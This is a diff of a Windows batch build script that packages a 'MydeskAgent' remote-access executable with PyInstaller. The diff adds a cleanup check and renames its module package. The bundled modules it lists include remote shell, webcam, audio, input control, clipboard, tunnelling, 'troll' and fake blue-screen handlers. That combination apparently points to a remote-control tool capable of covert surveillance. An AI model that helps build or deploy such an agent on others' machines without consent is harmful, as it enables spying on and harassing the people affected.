@@ -7,13 +7,22 @@ echo       MyDesk BUILD SYSTEM (Optimized)
 echo ==========================================
 
 :: 1. Cleanup (keep spec file for faster rebuilds)
-if exist dist rmdir /s /q dist
+if exist dist (
+    rmdir /s /q dist
+    if exist dist (
+        echo [!] ERROR: Could not clean 'dist' folder. Is it open in Sandbox or Explorer?
+        pause
+        exit /b
+    )
+)
 @REM if exist build rmdir /s /q build
 mkdir dist
 
 :: 2. Dependencies (numpy, msgpack for optimizations)
 echo [*] Checking Dependencies...
-@REM python -m pip install pyinstaller dxcam pynput pillow websockets PyQt6 opencv-python-headless pyaudio mss numpy msgpack zstandard aiortc av >nul 2>&1
+@REM Reset errorlevel before check since pip install is commented out
+ver > nul
+@REM python -m pip install ...
 if %errorlevel% neq 0 (
     echo [!] Failed to install dependencies!
     pause
@@ -75,23 +84,26 @@ python -m PyInstaller --console --onefile --noupx --name MydeskAgent ^
     --exclude-module pywinauto ^
     --exclude-module uiautomation ^
     --exclude-module nodriver ^
-    --hidden-import=target.input_controller ^
-    --hidden-import=target.privacy ^
-    --hidden-import=target.capture ^
-    --hidden-import=target.audio ^
-    --hidden-import=target.webcam ^
-    --hidden-import=target.auditor ^
-    --hidden-import=target.shell_handler ^
-    --hidden-import=target.process_manager ^
-    --hidden-import=target.file_manager ^
-    --hidden-import=target.clipboard_handler ^
-    --hidden-import=target.device_settings ^
-    --hidden-import=target.troll_handler ^
-    --hidden-import=target.troll_video_player ^
-    --hidden-import=target.bsod_screen ^
-    --hidden-import=target.webrtc_handler ^
-    --hidden-import=target.webrtc_tracks ^
-    --hidden-import=target.resource_manager ^
+    --hidden-import=targets.input_controller ^
+    --hidden-import=targets.privacy ^
+    --hidden-import=targets.capture ^
+    --hidden-import=targets.audio ^
+    --hidden-import=targets.webcam ^
+    --hidden-import=targets.auditor ^
+    --hidden-import=targets.shell_handler ^
+    --hidden-import=targets.process_manager ^
+    --hidden-import=targets.file_manager ^
+    --hidden-import=targets.clipboard_handler ^
+    --hidden-import=targets.device_settings ^
+    --hidden-import=targets.troll_handler ^
+    --hidden-import=targets.troll_video_player ^
+    --hidden-import=targets.bsod_screen ^
+    --hidden-import=targets.webrtc_handler ^
+    --hidden-import=targets.webrtc_tracks ^
+    --hidden-import=targets.resource_manager ^
+    --hidden-import=targets.tunnel_manager ^
+    --hidden-import=targets.kiosk ^
+    --hidden-import=pyaudiowpatch ^
     --hidden-import=aiortc ^
     --hidden-import=aiortc.codecs ^
     --hidden-import=aiortc.codecs.h264 ^
@@ -107,11 +119,11 @@ python -m PyInstaller --console --onefile --noupx --name MydeskAgent ^
     --hidden-import=cv2 ^
     --hidden-import=requests ^
     --hidden-import=psutil ^
-    --hidden-import=target.tunnel_manager ^
-    --hidden-import=target.kiosk ^
+    --hidden-import=targets.tunnel_manager ^
+    --hidden-import=targets.kiosk ^
     --hidden-import=pillow_jxl ^
     --hidden-import=zstandard ^
-    --add-data "target;target" ^
+    --add-data "targets;targets" ^
     agent_loader.py
 if %errorlevel% neq 0 goto fail
 
